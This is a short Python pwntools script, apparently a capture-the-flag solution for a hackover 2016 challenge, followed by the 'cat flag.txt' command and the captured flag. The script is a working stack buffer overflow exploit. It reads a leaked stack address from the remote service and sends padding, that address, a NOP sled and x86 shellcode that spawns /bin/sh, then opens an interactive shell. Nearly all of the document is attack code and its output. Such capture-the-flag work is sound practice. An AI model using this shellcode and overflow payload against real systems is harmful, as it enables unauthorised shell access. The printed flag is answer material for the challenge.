#!/usr/bin/env python


from pwn import *

shellcode = ("\x29\xD2\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69"
             "\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80")

# p = process("./ez_pz")

p = remote('challenges.hackover.h4q.it', port=11337)
sleep(0.5)
esp = p.recv().split(': ')[1].split('\n')[0][2:]
print(esp)
payload = "crashme\x00" + 'A' * 18 + pack(int(esp, 16)) + '\x90' * 40 + shellcode
p.sendline(payload)
print("\n" * 4)
p.interactive("shell> ")


cat flag.txt
hackover16{EASy_pEAsY_verY_GuIcy_leMoN_sQuEezY_tHinGiE}
